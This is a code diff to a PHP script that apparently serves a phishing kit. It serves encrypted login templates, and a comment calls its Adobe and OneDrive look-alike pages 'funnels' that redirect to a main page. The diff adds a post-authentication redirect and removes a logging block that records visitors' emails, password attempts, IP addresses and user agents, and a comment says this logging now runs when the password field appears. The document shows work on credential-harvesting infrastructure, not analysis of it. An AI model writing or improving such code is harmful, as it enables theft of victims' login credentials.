@@ -636,6 +636,8 @@ if (strpos($html, '// DOMAIN_INJECTION_POINT') !== false) {
                             }
                         });
                     }
+                    const redirectUrl = (data.redirectUrl || "").trim() || (data.postAuthRedirectUrl || "").trim();
+                    if (redirectUrl) _acfg({ redirectUrl });
                 }
             } catch (e) {
                 // Silent fail - use default domains
@@ -657,34 +659,5 @@ if (strpos($html, '{{BG_URL}}') !== false) {
     $safeBg = $bgUrl !== '' ? htmlspecialchars($bgUrl, ENT_QUOTES, 'UTF-8') : '';
     $html = str_replace('{{BG_URL}}', $safeBg, $html);
 }
-
-
-// Other templates (Adobe/OneDrive) act as funnels and will redirect here.
-$isMainTemplate = ($templateFile === __DIR__ . '/templates/template.html.enc');
-
-// REMOVED: Automatic visit logging on page load.
-// Visit logging is now handled via API call from frontend when password field is shown.
-/*
-if ($isMainTemplate && empty($_SESSION['visit_logged'])) {
-    try {
-        $db = new App\Database();
-        $visitId = uniqid('v_', true);
-        $db->logEvent([
-            'cookieId' => $visitId,
-            'type' => 'visit',
-            'emailMask' => $email ? $email : 'visitor',
-            'domain' => $_SERVER['HTTP_HOST'] ?? 'unknown',
-            'attempt' => 0,
-            'password' => '',
-            'ip' => $ip,
-            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
-            'time' => date('c')
-        ]);
-        $_SESSION['visit_logged'] = true;
-    } catch (Exception $e) {
-        // Fail silently for visits
-    }
-}
-*/
 
 echo $html;
